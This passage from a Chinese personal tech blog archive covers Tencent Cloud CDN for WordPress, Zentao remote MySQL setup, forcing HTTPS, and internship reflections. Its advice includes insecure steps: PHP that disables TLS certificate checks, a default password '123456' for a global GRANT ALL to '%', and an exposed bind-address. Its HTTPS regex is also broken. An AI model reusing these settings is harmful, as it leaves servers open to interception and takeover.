<p><img src="https://cdn.gallery.uuanqin.top/img/image-43-1024x358.png" alt=""></p>
<p>如果修改不成功，比如：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-44-1024x57.png" alt=""></p>
<p>可尝试下一个方法。</p>
<h1>在服务器端修改</h1>
<p>位置在<code>/wp-content/themes/**\[你的主题名\]**/functions.php</code></p>
<p><code>[你的主题名]</code>位置为你当前使用的主题名称。</p>
<p>参考：<a href="https://themeforwp.net/archives/wordpress-edit-functions-php/">WordPress修改functions.php教程 - WP主题站 (themeforwp.net)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="910498382" class="record">
            <header>
                <h1 class="record-title">使用 CDN 加速 WordPress 博客网站</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>Archive, undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CDN');">CDN</button>
                    
                    <button class="btn" onclick="activeTag('COS');">COS</button>
                    
                    <button class="btn" onclick="activeTag('PicGo');">PicGo</button>
                    
                    <button class="btn" onclick="activeTag('对象存储');">对象存储</button>
                    
                    <button class="btn" onclick="activeTag('腾讯云');">腾讯云</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/17/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>使用CDN进行资源加速。以腾讯云CDN为例。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/new-out-of-date-cover.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>36451a4e</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!warning] 这是一篇过期文章[2023.08.24]<br>
本篇文章已过期。</p>
<ul>
<li>本文为网站早期文章，内容过于粗糙和简单</li>
<li>PicGo配置已随版本更新而变化</li>
<li>部分内容已整合至其他文章中</li>
</ul>
</blockquote>
<h1>为WordPress博客网站开启CDN加速</h1>
<p>服务器部署在阿里云，使用了腾讯云的CDN加速。</p>
<p>使用CDN：<a href="https://cloud.tencent.com/document/product/228/3149">内容分发网络 CDN 从零开始配置 CDN - 快速入门 - 文档中心 - 腾讯云 (tencent.com)</a></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220412210237.png" alt="QQ截图20220412210237"></p>
<p>源站配置应该像下图这样。如果选择COS，那么还要去腾讯云那里接入备案，接入备案前提还要买它的服务器...</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-47-1024x427.png" alt="image-47-1024x427"></p>
<p>如果网站支持HTTPS，并开启了强制跳转，那么这里回源协议不用选HTTPS。</p>
<p>啊，关于CDN的理解，走了很多弯路，现提供以下网址进行学习：<br>
<a href="https://cloud.tencent.com/developer/article/1959818">使用腾讯CDN加速WordPress - 云+社区 - 腾讯云 (tencent.com)</a><br>
<a href="https://cloud.tencent.com/document/product/228/41334">内容分发网络 CDN 源站配置 - 配置指南 - 文档中心 - 腾讯云 (tencent.com)</a><br>
<a href="https://help.aliyun.com/document_detail/40117.html">CDN的配置回源HOST与源站的区别 (aliyun.com)</a></p>
<p>提示：不管是在对CDN操作也好，还是对域名解析进行操作也好，都要等待一段时间才能生效。控制台提示操作成功了，也是要再等一会的。</p>
<p>开启CDN的过程中，出现了登录问题，解决方案是（腾讯云）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-42-1024x375.png" alt="image-42-1024x375"></p>
<p>参考：<br>
<a href="https://blog.csdn.net/weixin_35521315/article/details/116098343">php用cdn打不开,开启 CDN 后 wordpress 后台打不开的解决办法_柳不是刘的博客-CSDN博客</a><br>
<a href="https://blog.csdn.net/meiqia888/article/details/115404498">解决WordPress配置百度云CDN，后台无法登录问题_美洽技术的博客-CSDN博客</a><br>
<a href="https://cloud.tencent.com/document/product/228/43672">内容分发网络 CDN 域名接入常见问题 - 快速入门 - 文档中心 - 腾讯云 (tencent.com)</a><br>
<a href="https://www.csdn.net/tags/MtTaIgwsMjQ4MTU3LWJsb2cO0O0O.html">wordpress 不更新 加了CDN 用户购买 - CSDN</a></p>
<h1>为COS开启CDN</h1>
<p>如果需要对COS存储桶进行加速，我采用文档（<a href="https://cloud.tencent.com/document/product/436/18669">对象存储 CDN 加速概述 - 开发者指南 - 文档中心 - 腾讯云 (tencent.com)</a>）提供的第一种方法，使用默认CDN加速域名进行加速。</p>
<p>配置好后的配置图如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-45-1024x231.png" alt="image-45-1024x231"></p>
<p>如果平时在粘贴地址时使用了PicGo软件，注意在“使用自定义域名”这一栏填上默认CDN加速域名：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-46.png" alt=""></p>
<p>这样，在PicGo上传图片后得到的地址就是加速域名地址。</p>
<p>参考：<a href="https://cloud.tencent.com/document/product/228/37849">内容分发网络 CDN COS-CDN 计费说明 - 购买指南 - 文档中心 - 腾讯云 (tencent.com)</a></p>
<p>上面两项做完结果：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-48-1024x148.png" alt=""></p>
<h1>问题</h1>
<p>如果页面缓存还是有点问题，比如编辑了文章后，查看文章时并没有刷新。进入文章页面没有显示用户登录等。目前还没想到比较好的解决方法，在腾讯云<a href="https://console.cloud.tencent.com/cdn/refresh">刷新预热-内容分发网络 - 控制台 (tencent.com)</a>这里提交URL可以暂时的解决问题。</p>
<p>尝试的解决方案：在functions.php下添加自动刷新腾讯云控制台CDN缓存的操作。不懂有没有用（来源：<a href="https://www.ly522.com/1506.html">wordpress腾讯CDN缓存实现发布/更新文章/评论自动刷新-轻刻年轮 (ly522.com)</a>）。有用！有用！</p>
<pre><code class="language-php">/* 需要填写你的密钥，访问 https://console.qcloud.com/capi 获取 SecretId 及 $secretKey */
$secretKey = '填写你的密钥';
$secretId = '填写你的密钥';
 
//更新或发布文章清理本文和首页CDN缓存
add_action('publish_post', 'Clean_By_Publish', 0);
 
//提交评论更新本文CDN缓存
add_action('comment_post', 'Clean_By_Comments',0);
 
//评论被审核更新本文CDN缓存
add_action('comment_unapproved_to_approved', 'Clean_By_Approved',0);
 
//发布文章更新CDN缓存函数
function Clean_By_Publish($post_ID){
global $secretKey,$secretId;
$url = get_permalink($post_ID);
$action='RefreshCdnUrl';
/*要清理的页面，默认包含首页和文章页面，需要清理其他页面请自行发挥*/
$PRIVATE_PARAMS = array(
'urls.0' =&gt; home_url(),
'urls.1' =&gt; $url ,
);
$HttpUrl=&quot;cdn.api.qcloud.com&quot;;
/*除非有特殊说明，如MultipartUploadVodFile，其它接口都支持GET及POST*/
$HttpMethod=&quot;POST&quot;;
/*是否https协议，大部分接口都必须为https，只有少部分接口除外（如MultipartUploadVodFile）*/
$isHttps =true;
/*下面这五个参数为所有接口的 公共参数；对于某些接口没有地域概念，则不用传递Region（如DescribeDeals）*/
$COMMON_PARAMS = array(
'Nonce' =&gt; rand(),
'Timestamp' =&gt;time(NULL),
'Action' =&gt;$action,
'SecretId' =&gt; $secretId,
);
/***********************************************************************************/
CreateRequest($HttpUrl,$HttpMethod,$COMMON_PARAMS,$secretKey, $PRIVATE_PARAMS, $isHttps);
}
 
//提交评论清理文章CDN函数
function Clean_By_Comments($comment_id)
{
global $secretKey,$secretId;
$comment = get_comment($comment_id);
$url = get_permalink($comment-&gt;comment_post_ID);
$action='RefreshCdnUrl';
/*参数*/
$PRIVATE_PARAMS = array(
'urls.0' =&gt; $url,
);
$HttpUrl=&quot;cdn.api.qcloud.com&quot;;
/*除非有特殊说明，如MultipartUploadVodFile，其它接口都支持GET及POST*/
$HttpMethod=&quot;POST&quot;;
/*是否https协议，大部分接口都必须为https，只有少部分接口除外（如MultipartUploadVodFile）*/
$isHttps =true;
/*下面这五个参数为所有接口的 公共参数；对于某些接口没有地域概念，则不用传递Region（如DescribeDeals）*/
$COMMON_PARAMS = array(
'Nonce' =&gt; rand(),
'Timestamp' =&gt;time(NULL),
'Action' =&gt;$action,
'SecretId' =&gt; $secretId,
);
/***********************************************************************************/
CreateRequest($HttpUrl,$HttpMethod,$COMMON_PARAMS,$secretKey, $PRIVATE_PARAMS, $isHttps);
}
 
//评论被审核清理CDN缓存函数
function Clean_By_Approved($comment)
{
global $secretKey,$secretId;
$url = get_permalink($comment-&gt;comment_post_ID);
$action='RefreshCdnUrl';
/*参数*/
$PRIVATE_PARAMS = array(
'urls.0' =&gt; $url,
);
$HttpUrl=&quot;cdn.api.qcloud.com&quot;;
/*除非有特殊说明，如MultipartUploadVodFile，其它接口都支持GET及POST*/
$HttpMethod=&quot;POST&quot;;
/*是否https协议，大部分接口都必须为https，只有少部分接口除外（如MultipartUploadVodFile）*/
$isHttps =true;
/*下面这五个参数为所有接口的 公共参数；对于某些接口没有地域概念，则不用传递Region（如DescribeDeals）*/
$COMMON_PARAMS = array(
'Nonce' =&gt; rand(),
'Timestamp' =&gt;time(NULL),
'Action' =&gt;$action,
'SecretId' =&gt; $secretId,
);
/***********************************************************************************/
CreateRequest($HttpUrl,$HttpMethod,$COMMON_PARAMS,$secretKey, $PRIVATE_PARAMS, $isHttps);
}
 
//请求主函数，无需改动
function CreateRequest($HttpUrl,$HttpMethod,$COMMON_PARAMS,$secretKey, $PRIVATE_PARAMS, $isHttps)
{
$FullHttpUrl = $HttpUrl.&quot;/v2/index.php&quot;;
/***************对请求参数 按参数名 做字典序升序排列，注意此排序区分大小写*************/
$ReqParaArray = array_merge($COMMON_PARAMS, $PRIVATE_PARAMS);
ksort($ReqParaArray);
/**********************************生成签名原文**********************************
* 将 请求方法, URI地址,及排序好的请求参数 按照下面格式 拼接在一起, 生成签名原文，此请求中的原文为
* GETcvm.api.qcloud.com/v2/index.php?Action=DescribeInstances&amp;Nonce=345122&amp;Region=gz
* &amp;SecretId=AKIDz8krbsJ5yKBZQ ·1pn74WFkmLPx3gnPhESA&amp;Timestamp=1408704141
* &amp;instanceIds.0=qcvm12345&amp;instanceIds.1=qcvm56789
* ****************************************************************************/
$SigTxt = $HttpMethod.$FullHttpUrl.&quot;?&quot;;
$isFirst = true;
foreach ($ReqParaArray as $key =&gt; $value)
{
if (!$isFirst)
{
$SigTxt = $SigTxt.&quot;&amp;&quot;;
}
$isFirst= false;
/*拼接签名原文时，如果参数名称中携带_，需要替换成.*/
if(strpos($key, '_'))
{
$key = str_replace('_', '.', $key);
}
$SigTxt=$SigTxt.$key.&quot;=&quot;.$value;
}
/*********************根据签名原文字符串 $SigTxt，生成签名 Signature******************/
$Signature = base64_encode(hash_hmac('sha1', $SigTxt, $secretKey, true));
/***************拼接请求串,对于请求参数及签名，需要进行urlencode编码********************/
$Req = &quot;Signature=&quot;.urlencode($Signature);
foreach ($ReqParaArray as $key =&gt; $value)
{
$Req=$Req.&quot;&amp;&quot;.$key.&quot;=&quot;.urlencode($value);
}
/*********************************发送请求********************************/
if($HttpMethod === 'GET')
{
if($isHttps === true)
{
$Req=&quot;https://&quot;.$FullHttpUrl.&quot;?&quot;.$Req;
}
else
{
$Req=&quot;http://&quot;.$FullHttpUrl.&quot;?&quot;.$Req;
}
$Rsp = file_get_contents($Req);
}
else
{
if($isHttps === true)
{
$Rsp= SendPost(&quot;https://&quot;.$FullHttpUrl,$Req,$isHttps);
}
else
{
$Rsp= SendPost(&quot;http://&quot;.$FullHttpUrl,$Req,$isHttps);
}
}
//var_export(json_decode($Rsp,true));
return json_decode($Rsp,true);
}
function SendPost($FullHttpUrl, $Req, $isHttps)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $Req);
curl_setopt($ch, CURLOPT_URL, $FullHttpUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 1 );
if ($isHttps === true) {
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
}
$result = curl_exec($ch);
return $result;
}
</code></pre>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3237396916" class="record">
            <header>
                <h1 class="record-title">“禅道”的配置与数据库连接</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                    <button class="btn" onclick="activeTag('MySQL');">MySQL</button>
                    
                    <button class="btn" onclick="activeTag('Navicat');">Navicat</button>
                    
                    <button class="btn" onclick="activeTag('禅道');">禅道</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/18/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>禅道的安装方法与配置、数据库连接与操作。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/cdcover.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>c0f6c1b4</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>禅道官网镇楼：<a href="https://www.zentao.net/">项目管理软件 开源项目管理软件 免费项目管理软件 - 禅道开源项目管理软件 (zentao.net)</a></p>
<h1>禅道安装</h1>
<p>安装与操作指南见：<a href="https://www.zentao.net/book/zentaopmshelp/90.html">linux 用一键安装包 - 禅道开源版使用帮助 - 禅道开源项目管理软件 (zentao.net)</a>。注意记住你开启的 Apache 端口和 Mysql 端口。比如这篇教程的 81 端口和 3307 端口。</p>
<p>如果你已经安了 LAMP，尝试看这篇安装禅道：<a href="https://www.zentao.net/book/zentaopmshelp/101.html">使用源码包安装(各系统通用) - 禅道开源版使用帮助 - 禅道开源项目管理软件 (zentao.net)</a></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220411234927-1024x549.png" alt=""></p>
<p>正常打开的界面</p>
<p>如果你在云服务器进行操作，别忘了在安全组打开端口。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220411234940-1024x47.png" alt=""></p>
<h1>禅道内批量导入用户数据</h1>
<p>需要进入数据库进行操作。网页登录禅道数据库的方法：<a href="https://www.zentao.net/book/zentaopmshelp/90.html">(推荐)linux 用一键安装包 - 禅道开源版使用帮助 - 禅道开源项目管理软件 (zentao.net)</a></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-35.png" alt=""></p>
<p>网页直接登录：</p>
<ul>
<li>系统：默认选择 MySQL。</li>
<li>服务器：127.0.0.1:mysql 端口（mysql 端口启用的是 3307，那么就填写 127.0.0.1:3307。<strong>注意：ip 只能写 127.0.0.1</strong>）</li>
<li>用户名： root。（禅道默认的数据库用户名是 root）</li>
<li>密码：123456。（禅道默认的数据库密码是 123456）</li>
<li>数据库：zentao。</li>
</ul>
<p>进入数据库，找到表 zt_user 即可进行操作。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-27.png" alt=""></p>
<p>我的批量添加的方法是，按照表的结构，另外在 Excel 中创建一个。参照数据库中的默认数据进行填充。</p>
<p>Password 应填入 MD5 加密后的结果。Excel 使用 MD5 对字符串进行加密请参见我的另一篇文章：《Excel 琐碎 - 半方池水半方田》</p>
<p>构造好后进行 csv 文件的导入即可。</p>
<p>做完这些操作，会发现用户没有权限，这时候就需要看另一张表 zt_usergroup。以同样的方式，构造表，导入即可。</p>
<blockquote>
<p>[!Error]<br>
原文此位置包含图片，现链接已被覆盖造成丢失，且复查时存在疏漏。原图片命名为：image-36.png</p>
</blockquote>
<p>导入数据灵感参考：<a href="https://www.inqingdao.cn/1151.html">禅道用 csv 方式批量导入用户方法 – 在情岛 (inqingdao.cn)</a></p>
<h1>使用 Navicat 连接禅道数据库</h1>
<p>（服务器为 Linux 系统）</p>
<p>导入用户数据还可以使用 Navicat 进行导入。</p>
<p>首先登录 adminer，选择 MySQL 数据库：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220418110939-1024x432.png" alt=""></p>
<p>执行 SQL 命令：</p>
<pre><code class="language-SQL">GRANT ALL ON *.* TO 'zentao'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;
</code></pre>
<p>你会发现增加了一条记录。用户名 zentao。</p>
<p>进入服务器，找到 mysql 配置目录：</p>
<pre><code>find / -name my.cnf
vim /opt/zbox/etc/mysql/my.cnf
</code></pre>
<p>注释掉 bind-address</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/5ITZPXL8RMSS4ZPU_UYM.png" alt=""></p>
<p>进入禅道的 MySQL，刷新权限。重启禅道。</p>
<pre><code>/opt/zbox/bin/mysql -u root -p # 进入后输入的是禅道配的mysql数据库密码，默认123456
MariaDB [(none)]&gt; FLUSH PRIVILEGES; # 刷新权限（在刚刚打开的网页上执行SQL应该也行）

/opt/zbox/zbox restart
</code></pre>
<p>接下来使用 Navicat 登录即可：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220418111459.png" alt=""></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.51cto.com/u_7034817/3407526">Windows 下使用 Navicat 远程连接禅道 Mysql 数据库_薄心之心的技术博客_51CTO 博客</a></li>
<li><a href="https://blog.csdn.net/lizhiyuan_eagle/article/details/81282893">navicat 远程连接 linux 禅道 mysql 设置_老刀聊 JAVA 的博客-CSDN 博客_navicat 远程连接禅道数据库</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2062987538" class="record">
            <header>
                <h1 class="record-title">WordPress 使用 HTTPS</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('HTTPS');">HTTPS</button>
                    
                    <button class="btn" onclick="activeTag('SSL');">SSL</button>
                    
                    <button class="btn" onclick="activeTag('WordPress');">WordPress</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/21/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>如果网站是WordPress网站，配置好证书后下一步怎么做？</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>7af6b112</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>服务器安装好证书后[^1]，访问WordPress博客还会提醒该站点“并非完全安全”。</p>
<p>[^1]: 参考<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link ">Linux 服务器 HTTPS 的配置</a></p>
<p>WordPress 设置中修改地址：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-5sad8.png" alt=""></p>
<p>将 <code>http</code> 修改为 <code>https</code></p>
<p>如果修改不成功（比如页面不安全什么的），可以通过数据库修改：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-59asda.png" alt=""></p>
<p>登录服务器，修改文件：</p>
<p>1，修改的路径：\wp-includes\functions.php 文件<br>
2，打开修改 functions.php 文件，找到代码 require( ABSPATH . WPINC . ‘/option.php’ ); 在下方添加：</p>
<pre><code class="language-php">add_filter('script_loader_src', 'agnostic_script_loader_src', 20,2);
function agnostic_script_loader_src($src, $handle) {
  return preg_replace('/^(httphttps):/', '', $src);
}
add_filter('style_loader_src', 'agnostic_style_loader_src', 20,2);
function agnostic_style_loader_src($src, $handle) {
  return preg_replace('/^(httphttps):/', '', $src);
}
</code></pre>
<p>再修改配置文件：</p>
<p>在<a href="https://so.csdn.net/so/search?q=wordpress&amp;spm=1001.2101.3001.7020">wordpress</a>网站根目录中找到，<code>wp-config.php</code> 文件，</p>
<p>在文件开头位置中，添加如下代码：</p>
<pre><code>$_SERVER['HTTPS'] = 'on';
define('FORCE_SSL_LOGIN', true);
define('FORCE_SSL_ADMIN', true);
</code></pre>
<h2>成果</h2>
<p>可以使用检查工具检查：<a href="https://decoder.link/sslchecker/www.uuanqin.top/443">SSL Checker (decoder.link)</a></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imageas-60.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-61asda.png" alt=""></p>
<h1>本文参考</h1>
<p><a href="https://blog.csdn.net/weixin_43983960/article/details/120096009?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_paycolumn_v3&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=2">【亲测】wordpress 如何开启全站 https-真实有效_前端小罗的博客-CSDN 博客_wordpress 设置 https</a></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1867823418">
                            <a href="#1867823418">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 服务器 HTTPS 的配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^1]: 参考<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link highlight">Linux 服务器 HTTPS 的配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1867823418">
                            <a href="#1867823418">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 服务器 HTTPS 的配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>WordPress 博客网站使用 HTTPS：<a href="#2062987538" title="WordPress 使用 HTTPS" class="record-link highlight">WordPress 使用 HTTPS</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1973703782" class="record">
            <header>
                <h1 class="record-title">【麒麟实训】开始与结束</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('面试');">面试</button>
                    
                    <button class="btn" onclick="activeTag('麒麟实训');">麒麟实训</button>
                    
                    <button class="btn" onclick="activeTag('总结');">总结</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/26/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>梦中的两个月。</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/interview220426.png</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240730234421.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>75a45466</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!notice] 文章重组提示 [2024.07.30]<br>
本文将以下文章进行聚合：</p>
<ul>
<li>【麒麟实训】我想在这次的实训项目中，达成怎样的目的？</li>
<li>【麒麟实训】实训结束 - 感谢篇</li>
</ul>
</blockquote>
<h1>【麒麟实训】我想在这次的实训项目中，达成怎样的目的？</h1>
<h2>面试</h2>
<p>虽然只是实训面试，但这也算我第一次感受到企业面试的思路和流程。本次面试我面试的是麒麟的生态运营部。</p>
<p>关注内容：</p>
<ul>
<li>你的简历。</li>
<li>你写在简历上的项目。在这之前问你还有没有补充，有补充的赶紧补充，接下来她要问项目了。</li>
<li>你的某个详细项目。你的角色和作用。</li>
</ul>
<p>知识与经验：</p>
<ul>
<li>Java 水平，Python 水平</li>
<li>面向对象的特点</li>
<li>是否了解交叉编译</li>
<li>浏览器输入网址后，点击确认键。之后发生了什么。</li>
</ul>
<p>善后：</p>
<ul>
<li>为什么选择这个部门</li>
<li>还有什么想问的</li>
</ul>
<h2>第一天</h2>
<p>我想在这次的实训项目中，达成怎样的目的？</p>
<ol>
<li>我想积累项目经验。不管是在学业上还是在以后找工作上，有一份真实的经验</li>
<li>学到开发知识，提高自己的编程能力。</li>
<li>初步体验工作环境</li>
<li>感受团队氛围。和大家在一起工作，认识几个新朋友，共同努力完成一份工作。这也是一个很不错的体验。</li>
</ol>
<h2>实训结束</h2>
<p>这个问题贯穿整个实训过程的重要环节。线下见面时，每个人都需要谈论整个问题，同时也需要用一个关键词描述自己对于这次实训所期待达成的目标。最后的答辩时，这个问题也是重要的考核问题。</p>
<h1>【麒麟实训】实训结束 - 感谢篇</h1>
<p>本文章为闲聊心得文。</p>
<h2>技术备忘</h2>
<p>关于大项目开发中有几个技术核心点是值得学习和利用的：</p>
<ul>
<li>PyQt UI 界面设计</li>
<li>跳转设计</li>
<li>样式设计</li>
<li>合作开发模式</li>
<li>Pyqt 子窗口嵌入</li>
<li>终端嵌入的实现方法</li>
</ul>
<h2>未来可探究</h2>
<p>项目还存在发展空间（我们还可以做到更好的点）：</p>
<ul>
<li>UI 用例显示</li>
<li>UI 日志友好回显</li>
<li>成功打包、安装、运行 PyQt 项目</li>
<li>打开目录时不卡顿的解决</li>
</ul>
<h2>答辩</h2>
<p>当初见面时，自己定的目标是“成就”，后改口“成长”。毕竟实训只是一个平台，能实现“成就”的平台还要自己探索，取得“成就”的能力还需要自己去培养。</p>
<p>导师问题：</p>
<ul>
<li>这次实训，你的目标达成了百分之多少？还需要做哪些努力以达到这个目标？</li>
<li>对于这次实训你有什么想说的？有什么想吐槽的？</li>
<li>如果大项目再重新做，你会怎样做？项目还有哪些需要改进的地方？</li>
</ul>
<h2>总结与回顾</h2>
<p>两个多月的共同工作，对于我来说是收获了许多经验的。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220701173447198.png" alt="image-20220701173447198"></p>
<p>期间做了许多工作，了解到了许多工作流程。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220701173528924.png" alt="image-20220701173528924"></p>
<p>不管是画图还是代码、文档，有始有终做完一件事情是十分有成就感的。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220701173710136.png" alt="image-20220701173710136"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220701173731781.png" alt="image-20220701173731781"></p>
<p>期间，自己开辟新战线。自我钻研时我感觉十分自由。当然团队合作时对每个人也是一个考验。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220701173923859.png" alt="image-20220701173923859"></p>
<p>交到玩的不错的新朋友、体验一次十分不错的团队合作也是我的重要收获之一。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220701174025478.png" alt="image-20220701174025478"></p>
<p>有成就，也有遗憾。希望未来的我们都在自己的道路上发光发热。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220701174237168.png" alt="image-20220701174237168"></p>
<p>十分感谢一起合作的同学们，以及陪伴我们成长的导师们！</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E5%9B%BE%E7%89%87202207011726.jpg" alt="image"></p>
<p>有缘再聚！</p>
<hr>
<h1>相关文章</h1>
<p><a href="#1433349372" title="【麒麟实训】撷英分享" class="record-link ">【麒麟实训】撷英分享</a></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1433349372">
                            <a href="#1433349372">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>【麒麟实训】撷英分享</span>
                                
                                <div class="record-links-context hover">
                                    <p><a href="#1433349372" title="【麒麟实训】撷英分享" class="record-link highlight">【麒麟实训】撷英分享</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3567162190">
                            <a href="#3567162190">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>那一年的暑假剪影</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^Kylin]: 更多内容详见 <a href="#1973703782" title="【麒麟实训】开始与结束" class="record-link highlight">【麒麟实训】开始与结束</a><br>
今天谈论的话题是进入计算机软件行业的学习后，我对电子设备上的各种执念。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1433349372" class="record">
            <header>
                <h1 class="record-title">【麒麟实训】撷英分享</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Deb包');">Deb包</button>
                    
                    <button class="btn" onclick="activeTag('Kylin');">Kylin</button>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                    <button class="btn" onclick="activeTag('麒麟实训');">麒麟实训</button>
                    
                    <button class="btn" onclick="activeTag('pyinstaller');">pyinstaller</button>
                    
                    <button class="btn" onclick="activeTag('PyQt');">PyQt</button>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                    <button class="btn" onclick="activeTag('编译');">编译</button>
                    
